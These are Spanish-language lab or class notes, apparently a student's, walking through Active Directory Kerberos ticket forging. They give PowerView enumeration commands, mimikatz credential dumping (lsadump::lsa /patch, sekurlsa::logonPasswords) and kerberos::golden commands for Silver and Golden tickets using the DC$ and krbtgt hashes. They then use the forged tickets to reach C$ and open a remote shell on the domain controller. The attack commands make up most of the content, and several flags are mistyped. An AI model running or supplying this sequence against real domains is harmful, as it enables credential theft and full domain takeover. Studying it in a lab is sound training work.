Hay una pagina que nos dice según lo que queremos hacer en Windows el tipo de ticket que necesitamos hacer

## Information gathering
-Nombre de dominio: example.com
-SID de dominio: [NUMERO]
-Nombre de la maquina a la que nos vamos a conectar: DC
-Hashs NTLM del servicio DC$: [Hash]
-Nombre del usuario que vamos a suplantar: Administrator


Get-NetDomain (En la windows)
Get-DomainSID (En la windows)
Get-NetComputer | select name (En la windows)
![[Pasted image 20250807201738.png]]
(En la kali, el NTLM copn crackmapexec)
Get-NetUser | select name (En la windows)
## Silver Tickets

```
. .\mimikatz.exe
```

Una vez dentro de mimikatz hacemos lo siguiente:

```
kerberos::golden /domain:example.com /sid:[NumeroSID] /target:DC /rc4:[HashNTLM] /user:Administrator /servicie:CIFS /ptt
```
(Lo de goldes es así aunque sea silver)
Tengo que buscar el por que CIFS (Dice que según la web que hable al principio)
ppt: es para usar el ticket generado directamente en la sesión actual

Después salimos de mimikatz y ejecutamos 'klist'
Y ya vemos el ticket silver que lo hemos creado bien

Por ejemplo este ticket lo necesitábamos para acceder a :
```
ls \\DC\C$
```

Y podríamos hacer:
`Enter-PSSession -ComputerName DC`
Con esto nos da una shell en el DC y necesitamos los dos Silver tickets (Habria que mirar la pagina es el HTTP creo y otro)

## Golden Ticket
Un ticket de un usuario con privilegios máximos

Ejcutamos mimikatz:
```
. .\mimikatz.exe
```
 y usamos:
`lsadump::lsa /patch`
  Vuelca los hashes NTLM de la SAM
  
 Después:
`sekurlsa::logonPasswords \full`
 Hashes de contraseñas de usuarios logueados de forma temporal en la maquina


Para el golden ticket necesito el hash de KRBGT (Que es el user en windows que firma los tickets)
![[Pasted image 20250807205215.png]]

## Para hacer el ticket

```
kerberos::golden /domain:example.com /sid:[NUMERO] /target:DC /rc4:[HASH_DE_KRBTGT] /user:Administrator /id:500 /ppt
```
(Para el golden no hace falta servicio por que sirve tiene privilegios)
El id en el dumpeo de la base de datos desde la kali de NTLM se ve


Y listo ya tendriamos el golden ticket, podemos verificar saliendo de mimikatz y poniendo 'klist'

Y podríamos hacer:
`Enter-PSSession -ComputerName DC`
Que es una shell con permisos elevados
(Al profe le dio error de conexion)